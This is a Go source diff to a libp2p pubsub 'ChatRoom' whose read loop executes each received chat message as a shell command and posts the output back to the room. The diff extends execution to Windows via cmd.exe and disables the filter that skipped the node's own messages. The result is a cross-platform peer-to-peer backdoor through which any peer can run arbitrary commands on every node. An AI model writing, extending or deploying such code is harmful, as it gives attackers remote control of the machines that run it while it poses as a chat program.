@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"os/exec"
+	"runtime"
 
 	"github.com/libp2p/go-libp2p-core/peer"
 
@@ -95,24 +96,44 @@ func (cr *ChatRoom) readLoop() {
 			return
 		}
 		// only forward messages delivered by others
-		if msg.ReceivedFrom == cr.self {
-			continue
-		}
+		//if msg.ReceivedFrom == cr.self {
+		//	continue
+		//}
 		cm := new(ChatMessage)
 		err = json.Unmarshal(msg.Data, cm)
 		if err != nil {
 			continue
 		}
 		command := cm.Message
+		os := runtime.GOOS
 
-		out, err := exec.Command("sh", "-c", command).Output()
-
-		if err != nil {
-			continue
+		switch os {
+		case "windows":
+			out, err := exec.Command("cmd.exe", "/c", command).Output()
+			if err != nil {
+				continue
+			}
+			cm.Message = string(out)
+			// send valid messages onto the Messages channel
+			cr.Messages <- cm
+		case "linux":
+			out, err := exec.Command("sh", "-c", command).Output()
+			if err != nil {
+				continue
+			}
+			cm.Message = string(out)
+			// send valid messages onto the Messages channel
+			cr.Messages <- cm
+		default:
+			out, err := exec.Command("cmd.exe", "/c", command).Output()
+			if err != nil {
+				continue
+			}
+			cm.Message = string(out)
+			// send valid messages onto the Messages channel
+			cr.Messages <- cm
 		}
-		cm.Message = string(out)
-		// send valid messages onto the Messages channel
-		cr.Messages <- cm
+
 	}
 }
 
